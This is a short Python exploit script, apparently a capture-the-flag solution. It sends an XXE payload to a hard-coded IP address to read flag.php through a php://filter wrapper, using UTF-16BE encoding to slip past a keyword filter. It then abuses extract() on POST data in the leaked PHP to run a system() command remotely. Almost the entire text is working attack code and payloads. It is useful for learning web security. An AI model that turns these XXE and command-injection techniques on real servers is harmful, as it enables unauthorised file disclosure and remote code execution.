import requests
from base64 import b64decode

# arbitrary file via xxe
payload ='''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY sss SYSTEM 'php://filter/convert.base64-encode/resource=./flag.php'>]>
<foo><name>&sss;</name></foo>'''
open('payload.xml', 'wb').write(payload.encode())
# https://github.com/ajdumanhug/ctf/blob/master/web/xxe/csaw-unagi-web-200.md
fd = __import__("os").popen('cat payload.xml | iconv -f UTF-8 -t UTF-16BE  | base64 -w 0')
xml= b64decode(fd.read()).decode()

data = {
        "input": xml
}
res = requests.post("http://140.82.48.126:20003/", data=data)
print(b64decode(res.text).decode())
'''
<?php

extract($_POST);

function filter($data){
	 return str_replace(array("..", "filter", "php", "../", "base","encode","64","resource","://", "flag" ,"SYSTEM", "xxe", "user", "pass"), "", $data);
}

$example = "<creds><name>Welcome Here All My Friends</name></creds>";

if(isset($_GET['ambiyah'])){
	$ineedflag($givemeflag); 	
}
'''

# rce from extract()
data = {
        "ineedflag": "system",
        "givemeflag": "grep -inR KKST2020"
}
res = requests.post("http://140.82.48.126:20003/flag.php?ambiyah", data=data)
print(res.text)